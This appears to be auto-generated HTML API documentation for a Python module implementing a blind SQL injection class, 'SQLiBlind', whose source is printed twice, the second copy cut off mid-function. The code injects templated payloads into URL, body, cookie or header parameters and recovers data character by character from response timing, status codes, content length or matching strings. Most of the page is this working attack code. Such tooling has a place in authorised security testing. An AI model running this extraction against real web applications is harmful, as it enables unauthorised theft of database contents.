<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.9.1" />
<title>injection_warrior.sqli_blind API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>injection_warrior.sqli_blind</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from injection_warrior import warrior

# Author h0rac

import hashlib
import requests
import sys
import itertools
from bs4 import BeautifulSoup
import aiohttp
import sys
import asyncio
import time
import hashlib
import requests
import zipfile
from bs4 import BeautifulSoup
from termcolor import colored
import re


class SQLiBlind(warrior.Injector):
    def __init__(self, proxy=None, debug=False, allow_redirects=True):
        super().__init__(proxy, debug, allow_redirects)
        &#34;&#34;&#34;SQLiBlind constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        &#34;&#34;&#34;
        self.proxy = proxy
        self.debug = debug
        
    # START Base methods

    def _url_path_parse(self, url=&#34;&#34;, payloads=[]):
        return super(SQLiBlind, self)._url_path_parse(url=url, payloads=payloads)

    def _run(self, http_method=&#34;get&#34;, urls=[], html=False, injection_point=&#34;url&#34;, body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}, resp_body=True):
        return super(SQLiBlind, self)._run(http_method, urls, html, injection_point, body_params, req_json,resp_json, cookie_params, url_params, header_params, resp_body)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiBlind, self)._params_converted(payloads=payloads, params=params)

    def inject_payload(self, url=&#34;&#34;, payloads={}, blind_type=&#34;&#34;, 
                       content_length=None, status_code=0, 
                       search_string=&#34;&#34;, http_method=&#34;get&#34;, injection_point=&#34;url&#34;,  
                       body_params={}, req_json=False, resp_json=False, html=False, 
                       cookie_params={}, url_params={}, header_params={}, resp_body=True, **kwargs):
        &#34;&#34;&#34;method allows to inject payloads to HTTP request/s
           When payloads are used, header|body|cookie|url dictionary should have value as %$%
           example: url_params = {&#34;productId&#34;: %$%}

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            payloads (list, optional): [list of payloads for which requests will be generated]. Defaults to [].
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True.
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        
        sleep = kwargs.get(&#39;sleep&#39;) if kwargs.get(&#39;sleep&#39;) != None else 5
        iterations = kwargs.get(&#39;iterations&#39;) if kwargs.get(&#39;iterations&#39;) != None else 1
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;

        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] BLIND attack &#39;inject_payload&#39; selected parameters: 
            ITERATIONS: {}
            BLIND TYPE ATTACK: {}
            EXPECTED STATUS CODE: {}
            EXPECTED CONTENT LENGTH: {}
            EXPECTED SEARCH STRING: {}
            TIME BASED SLEEP: {}
            URL: {}
            HTTP METHOD: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            RESP_BODY:{}
            KWARGS: {}
             &#39;&#39;&#39;.format(iterations, blind_type, status_code, content_length, search_string, sleep, url, http_method, payloads, injection_point, 
                        body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params,
                resp_body, kwargs), &#34;yellow&#34;))

        values = []
        cookie_params_list = []

        urls = self._url_path_parse(url, payloads)
        if not len(urls) &gt; 0:
            urls = [url]

        if search_string != &#34;&#34; and not html:
            print(colored(
                &#34;[-] Not supported combination for search_string:&#39;{}&#39; and html: &#39;{}&#39; &#34;.format(search_string, html), &#34;red&#34;))
            sys.exit(0)

        if iterations &gt; 0 and blind_type == &#34;time_based&#34;:
            # TODO FINISH OTHER INJECTION POINTS
            responses = []
            if injection_point == &#34;cookie&#34;:
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                for cookie_params in cookie_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;url&#34;:
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                for url_params in url_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;body&#34;:
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                for body_params in body_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;header&#34;:
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                for header_params in header_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))

            return self.__get_time_based_results(responses=responses, sleep=kwargs.get(&#39;sleep&#39;), injection_point=injection_point, status_code=status_code, content_length=content_length, search_string=search_string, comma=kwargs.get(&#39;comma&#39;))

        if iterations &gt; 0 and blind_type != &#34;time_based&#34;:
            responses = []
            if injection_point == &#34;cookie&#34;:
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                     cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)
            elif injection_point == &#34;url&#34;:
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params_list, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == &#34;body&#34;:
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params_list, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == &#34;header&#34;:
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            return self.__process_responses(responses=responses, search_string=search_string,
                                        status_code=status_code, content_length=content_length, url=url, injection_point=injection_point, comma=comma, sleep=sleep)

        return super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params, url_params=url_params, header_params=header_params, resp_body=resp_body)

    def __process_responses(self, responses=[], search_string=&#34;&#34;, status_code=0, content_length=1, url=&#34;&#34;, injection_point=&#34;&#34;, comma=&#34;&#39;&#34;, sleep=0):
        client_resp = None
        soup_html = None
        responses_results = []
        try:
            ascii_value = &#34;&#34;
            for r in responses:
                client_resp = r.get(&#39;raw_response&#39;)
                header_param = r.get(&#39;header_params&#39;)
                json_resp = r.get(&#39;json_resp&#39;)
                soup_html = r.get(&#39;soup&#39;)
                cookie_param = r.get(&#39;cookie&#39;)
                url_param = r.get(&#39;url_param&#39;)
                header_param = r.get(&#39;header_param&#39;)
                body_param = r.get(&#39;body_param&#39;)
                elapsed = r.get(&#39;elapsed&#39;)

                if injection_point == &#34;cookie&#34;:
                    responses_results.append(self.__extract_data(param=cookie_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;header&#34;:
                    responses_results.append(self.__extract_data(param=header_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;url&#34;:
                    responses_results.append(self.__extract_data(param=url_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;body&#34;:
                    responses_results.append(self.__extract_data(param=body_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
        except TypeError as e:
            print(colored(&#34;[-] Error __process_responses: {}&#34;.format(e), &#34;red&#34;))
            sys.exit(0)

        return self.__display_responses(responses=responses_results, search_string=search_string, status_code=status_code,
                                        content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp, sleep=sleep)

    def __display_responses(self, responses=[], search_string=&#34;&#34;, status_code=404,
                            content_length=-1, soup_html=&#34;&#34;, comma=&#34;&#34;, client_resp=&#34;&#34;, sleep=0):
        flatten_responses = [
            item for sublist in responses for item in sublist]
        filtered_results = []
        for r in flatten_responses:
            for k, v in r.items():
                if k == &#34;elapsed&#34;:
                    v = int(v)
                    if v == int(sleep):
                        filtered_results.append(r)
                elif v == search_string and len(search_string) &gt; 0:
                    filtered_results.append(r)
                elif k == &#34;expect_status_code&#34; and client_resp != None and type(client_resp) != str:
                    if v == client_resp.status:
                        filtered_results.append(r)
                elif k == &#34;resp_content_length&#34;:
                    if content_length != None and int(v) &gt; content_length and content_length &gt; 0:
                        filtered_results.append(r)
                    # print(&#34;data: {}, iter: {}&#34;.format(r.get(&#39;ascii&#39;), r.get(&#39;iter&#39;)))

        print(filtered_results)
        data =[]
        for item in sorted(filtered_results, key=lambda i: i[&#39;iter&#39;]):
            for k, v in item.items():
                if k == &#34;iter&#34;:
                    # print(item.get(&#39;ascii&#39;), end=&#39;&#39;)
                    temp = item.get(&#39;ascii&#39;)
                    data.append(temp)
        return &#39;&#39;.join(data)

    def __extract_data(self, param=None, search_string=&#34;&#34;, status_code=0, content_length=-1, soup_html=None, comma=&#39;,&#39;, client_resp=None, elapsed=None):
        params = param.keys()
        responses_results = []
        ascii_value = &#34;&#34;
        resp_text = &#34;&#34;
        for key in params:
            m = re.search(r&#39;(%2c|,)\d+(%2c|,){1}&#39;, param.get(key))
            iteration = m.group(0).split(comma)[1]
            m = re.search(r&#39;(\)=)\d{1,3}&#39;, param.get(key))
            ascii_value = m.group(0).split(&#39;=&#39;)[1]
            if len(search_string) &gt; 0:
                resp_text = soup_html.find(text=re.compile(search_string))
            responses_results.append({&#39;search_string&#39;: resp_text, &#39;resp_status_code&#39;: client_resp.status if client_resp != None else &#34;&#34;, &#39;ascii&#39;: chr(
                int(ascii_value)), &#34;iter&#34;: int(iteration), &#34;resp_content_length&#34;:client_resp.headers[&#39;Content-Length&#39;], &#34;content_length&#34;: content_length, &#34;expect_status_code&#34;: status_code, &#34;elapsed&#34;: elapsed if elapsed != None else 1})
        # print(responses_results)
        return responses_results

    def __divide_conquer(self):
        reminders = []
        ascii_table = [x for x in range(32, 126)]
        for item in ascii_table:
            char = 128
            high_half = 0
            reminder = 128
            temp = char
            while char &gt; 1:
                if reminder not in reminders:
                    reminders.append(reminder)
                if item &lt; char:
                    high_half = char - temp
                    char = int(temp / 2)
                    reminder = char + high_half
                    temp = char
                else:
                    char = int(temp/2)
                    reminder = reminder + char
                    char = reminder
        return reminders

    def __get_prepared_params(self, params={}, payloads=[], **kwargs):
        values = []
        # TODO Fix usage of divide_conquer 
        # questions = self.__divide_conquer()
        questions = [x for x in range(32, 126)]
        # print(&#34;QUESTIONS&#34;, questions)
        for q in questions:
            for i in range(1, kwargs.get(&#39;iterations&#39;)+1):
                kwargs[&#39;iterations&#39;] = i
                kwargs[&#39;char&#39;] = q
                temp = self._parse_template(payloads=payloads, **kwargs)
                values.append(temp)
        flatten_values = [
            item for sublist in values for item in sublist]
        params_list = self._params_converted(
            payloads=flatten_values, params=params)
        return params_list

    def __get_time_based_results(self, responses=[], sleep=0, injection_point=&#34;url&#34;,  status_code=&#34;&#34;, content_length=&#34;&#34;, search_string=&#34;&#34;, comma=&#34;,&#34;):
        flatten_resp = [item for sublist in responses for item in sublist]
        responses_results = []
        soup_html=None,
        response = None
        for r in flatten_resp:
            response = r.get(&#39;raw_response&#39;)
            header_param = r.get(&#39;header_params&#39;)
            json_resp = r.get(&#39;json_resp&#39;)
            soup_html = r.get(&#39;soup&#39;)
            cookie_param = r.get(&#39;cookie&#39;)
            url_param = r.get(&#39;url_param&#39;)
            header_param = r.get(&#39;header_param&#39;)
            body_param = r.get(&#39;body_param&#39;)
            elapsed = r.get(&#39;elapsed&#39;)
            
            if injection_point == &#34;cookie&#34;:
                responses_results.append(
                    (elapsed, cookie_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;body&#34;:
                responses_results.append(
                    (elapsed, body_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;header&#34;:
                responses_results.append(
                    (elapsed, header_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;url&#34;:
                responses_results.append(
                    (elapsed, url_param, response, soup_html, content_length, status_code, search_string))

        n_responses = []
        for item in responses_results:
            n_responses.append(self.__extract_data(elapsed=item[0], param=item[1], client_resp=response,
                                                   soup_html=soup_html, comma=comma, content_length=content_length, status_code=status_code, search_string=search_string))
        return self.__display_responses(responses=n_responses, sleep=sleep)</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="injection_warrior.sqli_blind.SQLiBlind"><code class="flex name class">
<span>class <span class="ident">SQLiBlind</span></span>
<span>(</span><span>proxy=None, debug=False, allow_redirects=True)</span>
</code></dt>
<dd>
<div class="desc"><p>Main class of the framework</p>
<p>AI is creating summary for <strong>init</strong></p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>proxy</code></strong> :&ensp;<code>[type]</code>, optional</dt>
<dd>[description]. Defaults to None.</dd>
<dt><strong><code>debug</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[description]. Defaults to False.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class SQLiBlind(warrior.Injector):
    def __init__(self, proxy=None, debug=False, allow_redirects=True):
        super().__init__(proxy, debug, allow_redirects)
        &#34;&#34;&#34;SQLiBlind constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        &#34;&#34;&#34;
        self.proxy = proxy
        self.debug = debug
        
    # START Base methods

    def _url_path_parse(self, url=&#34;&#34;, payloads=[]):
        return super(SQLiBlind, self)._url_path_parse(url=url, payloads=payloads)

    def _run(self, http_method=&#34;get&#34;, urls=[], html=False, injection_point=&#34;url&#34;, body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}, resp_body=True):
        return super(SQLiBlind, self)._run(http_method, urls, html, injection_point, body_params, req_json,resp_json, cookie_params, url_params, header_params, resp_body)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiBlind, self)._params_converted(payloads=payloads, params=params)

    def inject_payload(self, url=&#34;&#34;, payloads={}, blind_type=&#34;&#34;, 
                       content_length=None, status_code=0, 
                       search_string=&#34;&#34;, http_method=&#34;get&#34;, injection_point=&#34;url&#34;,  
                       body_params={}, req_json=False, resp_json=False, html=False, 
                       cookie_params={}, url_params={}, header_params={}, resp_body=True, **kwargs):
        &#34;&#34;&#34;method allows to inject payloads to HTTP request/s
           When payloads are used, header|body|cookie|url dictionary should have value as %$%
           example: url_params = {&#34;productId&#34;: %$%}

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            payloads (list, optional): [list of payloads for which requests will be generated]. Defaults to [].
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True.
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        
        sleep = kwargs.get(&#39;sleep&#39;) if kwargs.get(&#39;sleep&#39;) != None else 5
        iterations = kwargs.get(&#39;iterations&#39;) if kwargs.get(&#39;iterations&#39;) != None else 1
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;

        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] BLIND attack &#39;inject_payload&#39; selected parameters: 
            ITERATIONS: {}
            BLIND TYPE ATTACK: {}
            EXPECTED STATUS CODE: {}
            EXPECTED CONTENT LENGTH: {}
            EXPECTED SEARCH STRING: {}
            TIME BASED SLEEP: {}
            URL: {}
            HTTP METHOD: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            RESP_BODY:{}
            KWARGS: {}
             &#39;&#39;&#39;.format(iterations, blind_type, status_code, content_length, search_string, sleep, url, http_method, payloads, injection_point, 
                        body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params,
                resp_body, kwargs), &#34;yellow&#34;))

        values = []
        cookie_params_list = []

        urls = self._url_path_parse(url, payloads)
        if not len(urls) &gt; 0:
            urls = [url]

        if search_string != &#34;&#34; and not html:
            print(colored(
                &#34;[-] Not supported combination for search_string:&#39;{}&#39; and html: &#39;{}&#39; &#34;.format(search_string, html), &#34;red&#34;))
            sys.exit(0)

        if iterations &gt; 0 and blind_type == &#34;time_based&#34;:
            # TODO FINISH OTHER INJECTION POINTS
            responses = []
            if injection_point == &#34;cookie&#34;:
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                for cookie_params in cookie_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;url&#34;:
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                for url_params in url_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;body&#34;:
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                for body_params in body_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == &#34;header&#34;:
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                for header_params in header_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))

            return self.__get_time_based_results(responses=responses, sleep=kwargs.get(&#39;sleep&#39;), injection_point=injection_point, status_code=status_code, content_length=content_length, search_string=search_string, comma=kwargs.get(&#39;comma&#39;))

        if iterations &gt; 0 and blind_type != &#34;time_based&#34;:
            responses = []
            if injection_point == &#34;cookie&#34;:
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                     cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)
            elif injection_point == &#34;url&#34;:
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params_list, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == &#34;body&#34;:
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params_list, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == &#34;header&#34;:
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            return self.__process_responses(responses=responses, search_string=search_string,
                                        status_code=status_code, content_length=content_length, url=url, injection_point=injection_point, comma=comma, sleep=sleep)

        return super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params, url_params=url_params, header_params=header_params, resp_body=resp_body)

    def __process_responses(self, responses=[], search_string=&#34;&#34;, status_code=0, content_length=1, url=&#34;&#34;, injection_point=&#34;&#34;, comma=&#34;&#39;&#34;, sleep=0):
        client_resp = None
        soup_html = None
        responses_results = []
        try:
            ascii_value = &#34;&#34;
            for r in responses:
                client_resp = r.get(&#39;raw_response&#39;)
                header_param = r.get(&#39;header_params&#39;)
                json_resp = r.get(&#39;json_resp&#39;)
                soup_html = r.get(&#39;soup&#39;)
                cookie_param = r.get(&#39;cookie&#39;)
                url_param = r.get(&#39;url_param&#39;)
                header_param = r.get(&#39;header_param&#39;)
                body_param = r.get(&#39;body_param&#39;)
                elapsed = r.get(&#39;elapsed&#39;)

                if injection_point == &#34;cookie&#34;:
                    responses_results.append(self.__extract_data(param=cookie_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;header&#34;:
                    responses_results.append(self.__extract_data(param=header_param, search_string=search_string, status_code=status_code,
